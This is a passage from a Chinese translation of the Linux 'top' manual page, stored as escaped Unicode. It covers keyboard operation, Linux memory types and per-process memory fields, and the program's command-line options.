\u6dfb\u52a0\u68c0\u67e5\u6761\u76ee c. \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6 7. \u4e00\u4e9b\u5947\u5999\u7684\u6280\u5de7 a. \u5185\u6838\u9b54\u672f b. \u7a97\u53e3\u5f39\u8df3 c. \u5927\u9e1f\u7a97\u53e3 d. \u4ea4\u6362\u7a97\u53e3 8. \u9519\u8bef, 9. \u53c2\u89c1 \u64cd\u4f5c \u5f53\u4f7f\u7528 top \u65f6\uff0c\u4e24\u4e2a\u6700\u91cd\u8981\u7684\u6309\u952e\u662f\u5e2e\u52a9\u952e (h \u6216 ? ) \u548c\u9000\u51fa\u952e (q)\u3002 \u53e6\u5916\uff0c\u5f53\u4f60\u5b8c\u6210\u65f6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4f20\u7edf\u7684\u4e2d\u65ad\u952e (^C)\u3002 \u5f53\u7b2c\u4e00\u6b21\u542f\u52a8\u65f6\uff0c\u4f60\u5c06\u770b\u5230\u4e3b top \u5c4f\u5e55\u4e0a\u7684\u8fd9\u4e9b\u4f20\u7edf\u5143\u7d20\uff1a1\uff09\u6458\u8981\u533a\u57df\uff1b2\uff09\u5b57\u6bb5/\u5217\u6807\u9898\uff1b3\uff09\u4efb\u52a1\u533a\u57df\u3002 \u6bcf\u4e2a\u90e8\u5206\u5c06\u5728\u540e\u7eed\u90e8\u5206\u4e2d\u8be6\u7ec6\u4ecb\u7ecd\u3002\u5728\u6458\u8981\u533a\u57df\u548c\u5217\u6807\u9898\u4e4b\u95f4\u8fd8\u6709\u4e00\u4e2a\u8f93\u5165/\u6d88\u606f\u884c\uff0c\u4e0d\u9700\u8981\u8fdb\u4e00\u6b65\u89e3\u91ca\u3002 \u4e3b top \u5c4f\u5e55\u901a\u5e38\u975e\u5e38\u9002\u5e94 X-Windows \u4e0b\u7ec8\u7aef\u5c3a\u5bf8\u7684\u53d8\u5316\u3002\u5176\u4ed6 top \u5c4f\u5e55\u53ef\u80fd\u4e0d\u592a\u9002\u5e94\uff0c\u5c24\u5176\u662f\u90a3\u4e9b\u5305\u542b\u9759\u6001\u6587\u672c\u7684\u5c4f\u5e55\u3002 \u8fd9\u6700\u7ec8\u53d6\u51b3\u4e8e\u4f60\u7684\u7279\u5b9a\u7a97\u53e3\u7ba1\u7406\u5668\u548c\u7ec8\u7aef\u4eff\u771f\u5668\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u4ed6\u4eec\u5bf9\u7ec8\u7aef\u5927\u5c0f\u548c\u5f53\u524d\u5185\u5bb9\u7684\u770b\u6cd5\u53ef\u80fd\u4e0e top \u7684\u770b\u6cd5\u4e0d\u540c\uff0c top \u7684\u770b\u6cd5\u59cb\u7ec8\u57fa\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u8c03\u7528\u3002 \u4efb\u4f55\u91cd\u65b0\u8c03\u6574\u5927\u5c0f\u64cd\u4f5c\u540e\uff0c\u5982\u679c top \u5c4f\u5e55\u635f\u574f\u3001\u4e0d\u5b8c\u6574\u6216\u65e0\u5e8f\uff0c\u53ea\u9700\u952e\u5165\u4e00\u4e9b\u65e0\u5bb3\u7684\u5b57\u7b26\u6216\u5149\u6807\u79fb\u52a8\u952e\u901a\u5e38\u4f1a\u6062\u590d\u5b83\u3002 \u5728\u6781\u7aef\u60c5\u51b5\u4e0b\uff0c\u4ee5\u4e0b\u5e8f\u5217\u51e0\u4e4e\u80af\u5b9a\u4f1a\u6062\u590d\u5b83\uff1a \u952e/\u547d\u4ee4 \u76ee\u6807 ^Z \u6302\u8d77 top fg \u6062\u590d top <\u5de6\u952e> \u5f3a\u5236\u91cd\u65b0\u7ed8\u5236\u5c4f\u5e55\uff08\u5982\u679c\u9700\u8981\uff09 \u4f46\u5982\u679c\u663e\u793a\u4ecd\u7136\u635f\u574f\uff0c\u8fd8\u6709\u4e00\u6b65\u53ef\u4ee5\u5c1d\u8bd5\u3002\u5728\u6302\u8d77 top \u540e\u4f46\u5728\u6062\u590d\u5b83\u4e4b\u524d\u63d2\u5165\u6b64\u547d\u4ee4\uff1a \u952e/\u547d\u4ee4 \u76ee\u6807 reset \u6062\u590d\u7ec8\u7aef\u8bbe\u7f6e \u6ce8\u610f\uff1atop \u7684\u663e\u793a\u5bbd\u5ea6\u5c06\u9650\u5236\u4e3a 512 \u4e2a\u4f4d\u7f6e\u3002\u663e\u793a\u6240\u6709\u5b57\u6bb5\u5927\u7ea6\u9700\u8981 250 \u4e2a\u5b57\u7b26\u3002\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\u901a\u5e38\u5206\u914d\u7ed9\u5f53\u524d\u53ef\u89c1\u7684\u4efb\u4f55\u53ef\u53d8\u5bbd\u5ea6\u5217\u3002 \u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5217\uff0c\u5982 COMMAND\uff0c\u5728\u4e3b\u9898 3a. \u5b57\u6bb5\u63cf\u8ff0\u4e2d\u6709\u6240\u8bf4\u660e\u3002\u5b9e\u9645\u8f93\u51fa\u5bbd\u5ea6\u4e5f\u53ef\u80fd\u53d7 -w \u5f00\u5173\u5f71\u54cd\uff0c\u8be5\u5f00\u5173\u5728\u4e3b\u9898 1. \u547d\u4ee4\u884c\u9009\u9879\u4e2d\u8ba8\u8bba\u3002 \u6700\u540e\uff0ctop \u7684\u67d0\u4e9b\u5c4f\u5e55\u6216\u529f\u80fd\u9700\u8981\u4f7f\u7528\u5149\u6807\u79fb\u52a8\u952e\uff0c\u5982\u6807\u51c6\u7bad\u5934\u952e\u52a0 Home\u3001End\u3001PgUp \u548c PgDn \u952e\u3002 \u5982\u679c\u4f60\u7684\u7ec8\u7aef\u6216\u4eff\u771f\u5668\u6ca1\u6709\u63d0\u4f9b\u8fd9\u4e9b\u952e\uff0c\u53ef\u4ee5\u63a5\u53d7\u4ee5\u4e0b\u7ec4\u5408\u4f5c\u4e3a\u66ff\u4ee3\uff1a \u952e \u7b49\u6548\u952e \u5de6\u952e alt + h \u4e0b\u952e alt + j \u4e0a\u952e alt + k \u53f3\u952e alt + l Home alt + ctrl + h PgDn alt + ctrl + j PgUp alt + ctrl + k End alt + ctrl + l \u5728\u63d0\u793a\u8f93\u5165\u884c\u5e76\u4ee5 <Enter> \u952e\u7ec8\u6b62\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0a\u952e\u548c\u4e0b\u952e\u5177\u6709\u7279\u6b8a\u610f\u4e49\u3002\u90a3\u4e9b\u952e\u6216\u5176\u522b\u540d\u53ef\u7528\u4e8e\u68c0\u7d22\u4ee5\u524d\u7684\u8f93\u5165\u884c\uff0c\u7136\u540e\u53ef\u4ee5\u7f16\u8f91\u5e76\u91cd\u65b0\u8f93\u5165\u3002 \u8fd8\u6709\u56db\u4e2a\u989d\u5916\u7684\u952e\u53ef\u7528\u4e8e\u884c\u5b9a\u5411\u8f93\u5165\u3002 \u952e \u7279\u6b8a\u610f\u4e49 \u4e0a\u952e \u56de\u5fc6\u65e7\u5b57\u7b26\u4e32\u4ee5\u91cd\u65b0\u7f16\u8f91 \u4e0b\u952e \u56de\u5fc6\u65b0\u5b57\u7b26\u4e32\u6216\u5220\u9664\u6574\u884c Insert \u5728\u63d2\u5165\u548c\u8986\u76d6\u6a21\u5f0f\u4e4b\u95f4\u5207\u6362 Delete \u5220\u9664\u5149\u6807\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u79fb\u52a8\u5176\u4ed6\u5b57\u7b26\u5411\u5de6 Home \u8df3\u81f3\u8f93\u5165\u884c\u7684\u5f00\u5934 End \u8df3\u81f3\u8f93\u5165\u884c\u7684\u672b\u5c3e Linux \u5185\u5b58\u7c7b\u578b \u5bf9\u4e8e\u6211\u4eec\u7684\u76ee\u7684\uff0c\u6709\u4e09\u79cd\u7c7b\u578b\u7684\u5185\u5b58\uff0c\u4e00\u79cd\u662f\u53ef\u9009\u7684\u3002\u9996\u5148\u662f\u7269\u7406\u5185\u5b58\uff0c\u8fd9\u662f\u4e00\u4e2a\u6709\u9650\u7684\u8d44\u6e90\uff0c\u4ee3\u7801\u548c\u6570\u636e\u5728\u6267\u884c\u6216\u5f15\u7528\u65f6\u5fc5\u987b\u9a7b\u7559\u5176\u4e2d\u3002\u5176\u6b21\u662f\u53ef\u9009\u7684\u4ea4\u6362\u6587\u4ef6\uff0c\u4fee\u6539\uff08\u810f\uff09\u5185\u5b58\u53ef\u4ee5\u4fdd\u5b58\u5728\u5176\u4e2d\uff0c\u5982\u679c\u5bf9\u7269\u7406\u5185\u5b58\u7684\u9700\u6c42\u8fc7\u591a\uff0c\u53ef\u4ee5\u7a0d\u540e\u68c0\u7d22\u3002\u6700\u540e\u662f\u865a\u62df\u5185\u5b58\uff0c\u8fd9\u662f\u4e00\u4e2a\u51e0\u4e4e\u65e0\u9650\u7684\u8d44\u6e90\uff0c\u670d\u52a1\u4e8e\u4ee5\u4e0b\u76ee\u6807\uff1a 1. \u62bd\u8c61\uff0c\u65e0\u9700\u7269\u7406\u5185\u5b58\u5730\u5740/\u9650\u5236 2. \u9694\u79bb\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5728\u4e00\u4e2a\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4 3. \u5171\u4eab\uff0c\u4e00\u4e2a\u6620\u5c04\u53ef\u4ee5\u6ee1\u8db3\u591a\u4e2a\u9700\u6c42 4. \u7075\u6d3b\u6027\uff0c\u5c06\u865a\u62df\u5730\u5740\u5206\u914d\u7ed9\u6587\u4ef6 \u65e0\u8bba\u8fd9\u4e9b\u5f62\u5f0f\u7684\u5185\u5b58\u662f\u54ea\u79cd\uff0c\u6240\u6709\u7684\u5185\u5b58\u90fd\u4f5c\u4e3a\u9875\u9762\uff08\u901a\u5e38\u4e3a 4096 \u5b57\u8282\uff09\u8fdb\u884c\u7ba1\u7406\uff0c\u4f46\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5728 top \u4e2d\u4ee5 KiB\uff08\u5343\u5b57\u8282\uff09\u8868\u793a\u3002 \u5728\u4e3b\u9898 `2c. \u5185\u5b58\u4f7f\u7528` \u4e2d\u8ba8\u8bba\u7684\u5185\u5b58\u5904\u7406\u7684\u662f\u6574\u4e2a\u7cfb\u7edf\u7684\u7269\u7406\u5185\u5b58\u548c\u4ea4\u6362\u6587\u4ef6\u3002\u5728\u4e3b\u9898 `3. \u5b57\u6bb5/\u5217\u663e\u793a` \u4e2d\u5ba1\u67e5\u7684\u5185\u5b58\u6db5\u76d6\u4e86\u4e09\u79cd\u5185\u5b58\u7c7b\u578b\uff0c\u4f46\u9488\u5bf9\u7684\u662f\u5355\u4e2a\u8fdb\u7a0b\u3002 \u5bf9\u4e8e\u6bcf\u4e2a\u8fd9\u6837\u7684\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u5185\u5b58\u9875\u9762\u9650\u5236\u5728\u4e0b\u9762\u8868\u683c\u4e2d\u7684\u4e00\u4e2a\u8c61\u9650\u4e2d\u3002\u7269\u7406\u5185\u5b58\u548c\u865a\u62df\u5185\u5b58\u53ef\u4ee5\u5305\u542b\u4efb\u4f55\u56db\u4e2a\u8c61\u9650\uff0c\u800c\u4ea4\u6362\u6587\u4ef6\u53ea\u5305\u542b\u7b2c1\u5230\u7b2c3\u8c61\u9650\u3002 \u5f53\u4fee\u6539\u65f6\uff0c\u7b2c4\u8c61\u9650\u4e2d\u7684\u5185\u5b58\u5c06\u4f5c\u4e3a\u5176\u81ea\u5df1\u7684\u4e13\u7528\u4ea4\u6362\u6587\u4ef6\u3002 \u79c1\u6709 | \u5171\u4eab 1 | 2 \u533f\u540d . \u5806\u6808 | . malloc() | . brk()/sbrk() | . POSIX shm* . mmap(PRIVATE, ANON) | . mmap(SHARED, ANON) -----------------------+---------------------- . mmap(PRIVATE, fd) | . mmap(SHARED, fd) \u6587\u4ef6\u652f\u6301 . \u7a0b\u5e8f/\u5171\u4eab\u5e93 | 3 | 4 \u4ee5\u4e0b\u53ef\u80fd\u6709\u52a9\u4e8e\u89e3\u91ca\u8fdb\u7a0b\u7ea7\u5185\u5b58\u503c\uff0c\u8fd9\u4e9b\u503c\u663e\u793a\u4e3a\u53ef\u6269\u5c55\u5217\u5e76\u5728\u4e3b\u9898 `3a. \u5b57\u6bb5\u63cf\u8ff0` \u4e2d\u8ba8\u8bba\u3002 %MEM - \u7b80\u5355\u5730\u8bf4\u662f RES \u9664\u4ee5\u603b\u7269\u7406\u5185\u5b58 CODE - \u8c61\u9650 3 \u7684 `\u7a0b\u5e8f` \u90e8\u5206 DATA - \u8c61\u9650 1 \u7684 VIRT \u5168\u90e8\u52a0\u4e0a\u8c61\u9650 3 \u7684\u6240\u6709\u663e\u5f0f mmap \u6587\u4ef6\u652f\u6301\u9875\u9762 RES - \u5360\u7528\u7269\u7406\u5185\u5b58\u7684\u4efb\u4f55\u5185\u5bb9\uff0c\u4ece Linux-4.5 \u5f00\u59cb\uff0c\u662f\u4ee5\u4e0b\u4e09\u4e2a\u5b57\u6bb5\u7684\u603b\u548c\uff1a RSan - \u8c61\u9650 1 \u9875\u9762\uff0c\u5305\u62ec\u4efb\u4f55\u4fee\u6539\u8fc7\u7684\u524d\u8c61\u9650 3 \u9875\u9762 RSfd - \u8c61\u9650 3 \u548c\u8c61\u9650 4 \u9875\u9762 RSsh - \u8c61\u9650 2 \u9875\u9762 RSlk - \u4e0d\u80fd\u4ea4\u6362\u51fa\u7684 RES \u5b50\u96c6\uff08\u4efb\u4f55\u8c61\u9650\uff09 SHR - RES \u7684\u5b50\u96c6\uff08\u4e0d\u5305\u62ec 1\uff0c\u5305\u542b\u6240\u6709 2 \u548c 4\uff0c\u4e00\u4e9b 3\uff09 SWAP - \u53ef\u80fd\u662f\u9664 4 \u4e4b\u5916\u7684\u4efb\u4f55\u8c61\u9650 USED - \u7b80\u5355\u5730\u8bf4\u662f RES \u548c SWAP \u7684\u603b\u548c VIRT - \u6240\u6709\u5728\u7528\u548c/\u6216\u4fdd\u7559\u7684\uff08\u6240\u6709\u8c61\u9650\uff09 \u6ce8\u610f\uff1a\u5373\u4f7f\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\u88ab\u89c6\u4e3a\u8fdb\u7a0b\u79c1\u6709\uff0c\u5b83\u4eec\u4e5f\u4f1a\u88ab\u5185\u6838\u8bb0\u4f5c\u5171\u4eab\uff08SHR\uff09\u3002 1. \u547d\u4ee4\u884c\u9009\u9879 top \u7684\u547d\u4ee4\u884c\u8bed\u6cd5\u5982\u4e0b\uff1a -hv|-bcEeHiOSs1 -d \u79d2 -n \u6b21\u6570 -u|U \u7528\u6237 -p \u8fdb\u7a0bID -o \u5b57\u6bb5 -w [\u5217] \u901a\u5e38\u5fc5\u9700\u7684\u5f00\u5173 (`-`) \u751a\u81f3\u7a7a\u767d\u7b26\u90fd\u662f\u53ef\u9009\u7684\u3002 -h | -v :\u5e2e\u52a9/\u7248\u672c \u663e\u793a\u5e93\u7248\u672c\u548c\u4f7f\u7528\u63d0\u793a\uff0c\u7136\u540e\u9000\u51fa\u3002 -b :\u6279\u5904\u7406\u6a21\u5f0f\u64cd\u4f5c \u4ee5\u6279\u5904\u7406\u6a21\u5f0f\u542f\u52a8 top\uff0c\u8fd9\u5bf9\u4e8e\u5c06 top \u7684\u8f93\u51fa\u53d1\u9001\u5230\u5176\u4ed6\u7a0b\u5e8f\u6216\u6587\u4ef6\u53ef\u80fd\u5f88\u6709\u7528\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0ctop \u4e0d\u63a5\u53d7\u8f93\u5165\uff0c \u5e76\u8fd0\u884c\u76f4\u5230\u4f60\u7528 `-n` \u547d\u4ee4\u884c\u9009\u9879\u8bbe\u7f6e\u7684\u8fed\u4ee3\u6b21\u6570\u9650\u5236\uff0c\u6216\u76f4\u5230\u88ab\u6740\u6b7b\u3002 -c :\u547d\u4ee4\u884c/\u7a0b\u5e8f\u540d\u79f0\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 `c` \u72b6\u6001\u53cd\u8f6c\u3002\u56e0\u6b64\uff0c\u5982\u679c top \u663e\u793a\u547d\u4ee4\u884c\uff0c\u90a3\u4e48\u8be5\u5b57\u6bb5\u5c06\u663e\u793a\u7a0b\u5e8f\u540d\u79f0\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `c` \u4ea4\u4e92\u547d\u4ee4\u3002 -d :\u5ef6\u8fdf\u65f6\u95f4\u95f4\u9694\uff1a-d ss.t (\u79d2.\u5341\u5206\u4e4b\u4e00\u79d2) \u6307\u5b9a\u5c4f\u5e55\u66f4\u65b0\u4e4b\u95f4\u7684\u5ef6\u8fdf\uff0c\u5e76\u8986\u76d6\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u503c\u6216\u542f\u52a8\u9ed8\u8ba4\u503c\u3002\u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `d` \u6216 `s` \u4ea4\u4e92\u547d\u4ee4\u66f4\u6539\u3002 \u5206\u6570\u79d2\u662f\u6709\u6548\u7684\uff0c\u4f46\u4e0d\u5141\u8bb8\u8d1f\u6570\u3002\u7136\u800c\uff0c\u5982\u679c top \u4ee5\u5b89\u5168\u6a21\u5f0f\u8fd0\u884c\uff0c\u9664\u4e86 root \u4e4b\u5916\uff08\u9664\u975e\u4f7f\u7528\u4e86 `s` \u547d\u4ee4\u884c\u9009\u9879\uff09\uff0c\u5219\u7981\u6b62\u8fdb\u884c\u8fd9\u4e9b\u66f4\u6539\u3002 \u6709\u5173\u5b89\u5168\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 6d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u3002 -e :\u5f3a\u5236\u4efb\u52a1\u5185\u5b58\u7f29\u653e\uff1a-e k | m | g | t | p \u6307\u793a top \u5f3a\u5236\u4efb\u52a1\u533a\u57df\u5185\u5b58\u6309\u4ee5\u4e0b\u5355\u4f4d\u7f29\u653e\uff1a k - \u5343\u5b57\u8282 m - \u5146\u5b57\u8282 g - \u5409\u5b57\u8282 t - \u592a\u5b57\u8282 p - \u62cd\u5b57\u8282 \u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `e` \u547d\u4ee4\u5207\u6362\u66f4\u6539\u3002 -E :\u5f3a\u5236\u6458\u8981\u5185\u5b58\u7f29\u653e\uff1a-E k | m | g | t | p | e \u6307\u793a top \u5f3a\u5236\u6458\u8981\u533a\u57df\u5185\u5b58\u6309\u4ee5\u4e0b\u5355\u4f4d\u7f29\u653e\uff1a k - \u5343\u5b57\u8282 m - \u5146\u5b57\u8282 g - \u5409\u5b57\u8282 t - \u592a\u5b57\u8282 p - \u62cd\u5b57\u8282 e - \u827e\u5b57\u8282 \u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `E` \u547d\u4ee4\u5207\u6362\u66f4\u6539\u3002 -H :\u7ebf\u7a0b\u6a21\u5f0f\u64cd\u4f5c \u6307\u793a top \u663e\u793a\u5355\u4e2a\u7ebf\u7a0b\u3002\u5982\u679c\u6ca1\u6709\u6b64\u547d\u4ee4\u884c\u9009\u9879\uff0c\u5219\u663e\u793a\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6240\u6709\u7ebf\u7a0b\u7684\u6c47\u603b\u3002\u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528 `H` \u4ea4\u4e92\u547d\u4ee4\u66f4\u6539\u3002 -i :\u7a7a\u95f2\u8fdb\u7a0b\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 `i` \u72b6\u6001\u53cd\u8f6c\u3002\u5f53\u6b64\u5207\u6362\u4e3a\u5173\u95ed\u65f6\uff0c\u81ea\u4e0a\u6b21\u66f4\u65b0\u4ee5\u6765\u672a\u4f7f\u7528\u4efb\u4f55 CPU \u7684\u4efb\u52a1\u5c06\u4e0d\u4f1a\u663e\u793a\u3002 \u6709\u5173\u6b64\u5207\u6362\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u5927\u5c0f\u3002 -n :\u8fed\u4ee3\u6b21\u6570\u9650\u5236\uff1a-n \u6b21\u6570 \u6307\u5b9a top \u5e94\u751f\u6210\u7684\u6700\u5927\u8fed\u4ee3\u6b21\u6570\u6216\u5e27\u6570\uff0c\u7136\u540e\u7ed3\u675f\u3002 -o :\u8986\u76d6\u6392\u5e8f\u5b57\u6bb5\uff1a-o \u5b57\u6bb5\u540d \u6307\u5b9a\u4efb\u52a1\u5c06\u6309\u5176\u6392\u5e8f\u7684\u5b57\u6bb5\u540d\u79f0\uff0c\u4e0e\u914d\u7f6e\u6587\u4ef6\u4e2d\u53cd\u6620\u7684\u65e0\u5173\u3002\u4f60\u53ef\u4ee5\u5728\u5b57\u6bb5\u540d\u4e4b\u524d\u52a0\u4e0a `+` \u6216 `-` \u4ee5\u8986\u76d6\u6392\u5e8f\u65b9\u5411\u3002 \u4ee5 `+` \u5f00\u5934\u5c06\u5f3a\u5236\u4ece\u9ad8\u5230\u4f4e\u6392\u5e8f\uff0c\u800c `-` \u5c06\u786e\u4fdd\u4ece\u4f4e\u5230\u9ad8\u6392\u5e8f\u3002 \u6b64\u9009\u9879\u4e3b\u8981\u7528\u4e8e\u652f\u6301\u81ea\u52a8/\u811a\u672c\u5316\u6279\u5904\u7406\u6a21\u5f0f\u64cd\u4f5c\u3002 -O :\u8f93\u51fa\u5b57\u6bb5\u540d\u79f0 \u6b64\u9009\u9879\u5145\u5f53\u4e0a\u8ff0 -o \u9009\u9879\u7684\u4e00\u79cd\u5e2e\u52a9\u3002\u5b83\u5c06\u4f7f top \u6253\u5370\u6bcf\u4e2a\u53ef\u7528\u7684\u5b57\u6bb5\u540d\u79f0\u5728\u5355\u72ec\u7684\u884c\u4e0a\uff0c\u7136\u540e\u9000\u51fa\u3002 \u8fd9\u4e9b\u540d\u79f0\u53d7 NLS\uff08\u56fd\u5bb6\u8bed\u8a00\u652f\u6301\uff09\u7ffb\u8bd1\u7684\u5f71\u54cd\u3002 -p :\u76d1\u89c6\u8fdb\u7a0bID\u6a21\u5f0f\uff1a-pN1 -pN2 ... \u6216 -pN1,N2,N3 ... \u4ec5\u76d1\u89c6\u5177\u6709\u6307\u5b9a\u8fdb\u7a0bID\u7684\u8fdb\u7a0b\u3002\u6b64\u9009\u9879\u53ef\u4ee5\u7ed9\u51fa\u591a\u8fbe 20 \u6b21\uff0c\u6216\u8005\u4f60\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u6700\u591a\u5305\u542b 20 \u4e2a\u8fdb\u7a0bID\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002 \u53ef\u4ee5\u540c\u65f6\u4f7f\u7528\u4e24\u79cd\u65b9\u6cd5\u3002 \u8fdb\u7a0bID\u503c\u4e3a\u96f6\u5c06\u88ab\u89c6\u4e3a top \u7a0b\u5e8f\u672c\u8eab\u5728\u8fd0\u884c\u65f6\u7684\u8fdb\u7a0bID\u3002 \u8fd9\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u9009\u9879\uff0c\u5982\u679c\u4f60\u5e0c\u671b\u8fd4\u56de\u6b63\u5e38\u64cd\u4f5c\uff0c\u65e0\u9700\u9000\u51fa\u5e76\u91cd\u65b0\u542f\u52a8 top -- \u53ea\u9700\u53d1\u51fa\u4ee5\u4e0b\u4efb\u4f55\u4e00\u4e2a\u4ea4\u4e92\u547d\u4ee4\uff1a`=`\u3001`u` \u6216 `U`\u3002 `p`\u3001`u` \u548c `U` \u547d\u4ee4\u884c\u9009\u9879\u662f\u4e92\u65a5\u7684\u3002 -s :\u5b89\u5168\u6a21\u5f0f\u64cd\u4f5c \u5f3a\u5236\u4ee5\u5b89\u5168\u6a21\u5f0f\u542f\u52a8 top\uff0c\u5373\u4f7f\u662f root \u4e5f\u662f\u5982\u6b64\u3002\u6b64\u6a21\u5f0f\u901a\u8fc7\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u66f4\u597d\u5730\u63a7\u5236\uff08\u89c1\u4e3b\u9898 6. \u6587\u4ef6\uff09\u3002 -S :\u7d2f\u79ef\u65f6\u95f4\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 `S` \u72b6\u6001\u53cd\u8f6c\u3002\u5f53\u7d2f\u79ef\u65f6\u95f4\u6a21\u5f0f\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5c06\u5217\u51fa\u5176\u81ea\u8eab\u548c\u5df2\u7ec8\u6b62\u5b50\u8fdb\u7a0b\u4f7f\u7528\u7684 CPU \u65f6\u95f4\u3002 \u6709\u5173\u6b64\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `S` \u4ea4\u4e92\u547d\u4ee4\u3002 -u | -U :\u7528\u6237\u8fc7\u6ee4\u6a21\u5f0f\uff1a-u | -U \u7528\u6237ID\u6216\u540d\u79f0 \u4ec5\u663e\u793a\u5177\u6709\u7ed9\u5b9a\u7528\u6237ID\u6216\u7528\u6237\u540d\u7684\u8fdb\u7a0b\u3002`-u` \u9009\u9879\u5339\u914d\u6709\u6548\u7528\u6237\uff0c\u800c `-U` \u9009\u9879\u5339\u914d\u4efb\u4f55\u7528\u6237\uff08\u5b9e\u9645\u3001\u6709\u6548\u3001\u4fdd\u5b58\u6216\u6587\u4ef6\u7cfb\u7edf\uff09\u3002 \u5728\u7528\u6237ID\u6216\u540d\u79f0\u524d\u52a0\u4e0a\u611f\u53f9\u53f7\uff08`!`\uff09\u6307\u793a top \u4ec5\u663e\u793a\u4e0d\u5339\u914d\u63d0\u4f9b\u7684\u7528\u6237\u7684\u8fdb\u7a0b\u3002 `p`\u3001`u` \u548c `U` \u547d\u4ee4\u884c\u9009\u9879\u662f\u4e92\u65a5\u7684\u3002 -w :\u8f93\u51fa\u5bbd\u5ea6\u8986\u76d6\uff1a-w [\u6570\u5b57] \u5728\u6279\u5904\u7406\u6a21\u5f0f\u4e0b\uff0c\u5f53\u4e0d\u5e26\u53c2\u6570\u4f7f\u7528\u65f6\uff0ctop \u5c06\u4f7f\u7528\u8bbe\u7f6e\u7684 COLUMNS= \u548c LINES= \u73af\u5883\u53d8\u91cf\u683c\u5f0f\u5316\u8f93\u51fa\u3002\u5426\u5219\uff0c\u5bbd\u5ea6\u5c06\u56fa\u5b9a\u4e3a\u6700\u5927 512 \u5217\u3002 \u5e26\u53c2\u6570\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u53ef\u4ee5\u51cf\u5c11\u6216\u589e\u52a0\uff08\u6700\u591a 512\uff09\uff0c\u4f46\u884c\u6570\u88ab\u8ba4\u4e3a\u662f\u65e0\u9650\u7684\u3002 \u5728\u6b63\u5e38\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u5f53\u4e0d\u5e26\u53c2\u6570\u4f7f\u7528\u65f6\uff0ctop \u5c06\u5c1d\u8bd5\u4f7f\u7528\u8bbe\u7f6e\u7684 COLUMNS= \u548c LINES= \u73af\u5883\u53d8\u91cf\u683c\u5f0f\u5316\u8f93\u51fa\u3002 \u5e26\u53c2\u6570\u65f6\uff0c\u8f93\u51fa\u5bbd\u5ea6\u53ea\u80fd\u51cf\u5c11\uff0c\u4e0d\u80fd\u589e\u52a0\u3002\u65e0\u8bba\u662f\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u8fd8\u662f\u5e26\u53c2\u6570\u7684 -w\uff0c\u5f53\u4e0d\u5728\u6279\u5904\u7406\u6a21\u5f0f\u4e0b\u65f6\uff0c\u5b9e\u9645\u7ec8\u7aef\u5c3a\u5bf8\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u8d85\u8fc7\u3002 \u6ce8\u610f\uff1a\u4e0d\u4f7f\u7528\u6b64\u547d\u4ee4\u884c\u9009\u9879\uff0c\u8f93\u51fa\u5bbd\u5ea6\u59cb\u7ec8\u57fa\u4e8e\u8c03\u7528 top \u65f6\u7684\u7ec8\u7aef\uff0c\u65e0\u8bba\u662f\u5426\u5728\u6279\u5904\u7406\u6a21\u5f0f\u4e0b\u3002 -1 :\u5355/\u591a CPU \u72b6\u6001\u5207\u6362 \u542f\u52a8 top \u65f6\uff0c\u6700\u540e\u8bb0\u4f4f\u7684 CPU \u72b6\u6001\u90e8\u5206\u7684\u72b6\u6001\u53cd\u8f6c\u3002\u8981\u4e48\u5728\u4e00\u884c\u4e2d\u663e\u793a\u6240\u6709 CPU \u4fe1\u606f\uff0c\u8981\u4e48\u5206\u522b\u663e\u793a\u6bcf\u4e2a CPU\uff0c \u8fd9\u53d6\u51b3\u4e8e NUMA \u8282\u70b9\u547d\u4ee4\u5207\u6362\uff08'2'\uff09\u7684\u72b6\u6001\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `1` \u548c `2` \u4ea4\u4e92\u547d\u4ee4\u3002 2. \u6982\u8981\u663e\u793a 